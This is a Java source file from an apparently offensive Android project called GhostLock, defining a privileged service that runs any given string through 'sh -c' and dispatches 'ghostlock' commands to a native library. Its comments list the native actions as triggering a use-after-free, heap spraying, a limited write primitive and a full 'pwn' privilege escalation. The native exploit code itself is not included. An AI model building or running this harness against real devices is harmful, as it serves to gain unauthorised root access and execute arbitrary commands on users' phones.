package com.ghostlock.skeleton;

import java.io.BufferedReader;
import java.io.File;
import java.io.InputStreamReader;
import java.lang.Process;

import android.util.Log;

public class UserService extends IUserService.Stub {

    private static final String TAG = "GhostLockService";

    @Override
    public void destroy() {
        Log.i(TAG, "destroy called, exiting");
        System.exit(0);
    }

    @Override
    public String exec(String command) {
        if (command == null || command.trim().isEmpty()) {
            return "empty command";
        }

        // ghostlock 命令走 native 路径
        String trimmed = command.trim();
        if (trimmed.startsWith("ghostlock ") || trimmed.equals("ghostlock")) {
            return execNative(trimmed);
        }

        // 其他命令走 shell
        return execShell(trimmed);
    }

    /**
     * 加载 libghostlock.so 并以 shell/root 身份调用 native 入口。
     * 
     * 用法: ghostlock <action> [args...]
     *   ghostlock trigger     — 触发 GhostLock UAF
     *   ghostlock spray       — 栈喷射
     *   ghostlock write       — 受限写入原语
     *   ghostlock pwn         — 完整提权
     *   ghostlock info        — 显示编译信息
     */
    private String execNative(String cmd) {
        try {
            NativeBridge.ensureLoaded();

            // 解析参数：跳过 "ghostlock" 前缀
            String[] parts = cmd.split("\\s+");
            String[] args;
            int offset;
            if (parts.length > 0 && "ghostlock".equals(parts[0])) {
                args = new String[parts.length - 1];
                System.arraycopy(parts, 1, args, 0, args.length);
                offset = 1;
            } else {
                args = parts;
                offset = 0;
            }

            // 如果无参数，默认 info
            if (args.length == 0) {
                args = new String[]{"info"};
            }

            int ret = NativeBridge.execute(args);
            return "native exit: " + ret;
        } catch (UnsatisfiedLinkError e) {
            return "native lib not loaded: " + e.getMessage();
        } catch (Exception e) {
            return "native error: " + e.getMessage();
        }
    }

    /**
     * 以 shell 身份执行系统命令。
     */
    private String execShell(String command) {
        try {
            java.lang.Process p = Runtime.getRuntime().exec(new String[]{"sh", "-c", command});
            BufferedReader reader = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedReader errReader = new BufferedReader(new InputStreamReader(p.getErrorStream()));
            StringBuilder out = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) {
                out.append(line).append("\n");
            }
            while ((line = errReader.readLine()) != null) {
                out.append("[stderr] ").append(line).append("\n");
            }
            p.waitFor();
            int exit = p.exitValue();
            if (exit != 0) {
                out.append("(exit: ").append(exit).append(")");
            }
            return out.toString().trim();
        } catch (Exception e) {
            return "shell error: " + e.getMessage();
        }
    }
}
